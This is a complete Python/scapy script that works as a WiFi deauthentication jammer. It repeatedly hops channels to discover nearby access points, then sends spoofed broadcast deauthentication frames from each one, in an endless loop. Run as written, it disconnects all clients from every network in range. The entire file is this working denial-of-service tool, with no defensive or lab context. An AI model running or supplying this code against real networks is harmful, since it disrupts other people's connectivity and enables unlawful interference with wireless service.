#!/usr/bin/env python
from scapy.all import *
from sys import argv
from os import system
from time import sleep
from random import randrange
from multiprocessing import Process

iface = argv[1]


def wifi_snif():
    pkt = sniff(iface=iface, timeout=1,
                lfilter=lambda x: x.haslayer(Dot11Beacon) or x.haslayer(
                    Dot11ProbeResp))
    u_pkt = []
    u_addr2 = []
    for p in pkt:
        if p.addr2 not in u_addr2:
            u_pkt.append(p)
            u_addr2.append(p.addr2)
    return u_pkt


def deauth(pkt):
    system("iw dev %s set channel %d" % (iface, ord(pkt[Dot11Elt:3].info)))
    sendp(RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff",
                             addr2=pkt.addr2, addr3=pkt.addr3) / Dot11Deauth(),
          count=4, iface=iface, verbose=0)


def chg_cnl():
    while True:
        cnl = randrange(1, 13)
        system("iw dev %s set channel %d" % (iface, cnl))
        sleep(0.3)


def main_fnc():
    p = Process(target=chg_cnl)
    p.start()
    pkt_ssid = wifi_snif()
    p.terminate()
    for pkt in pkt_ssid:
        deauth(pkt)


while 1:
    main_fnc()
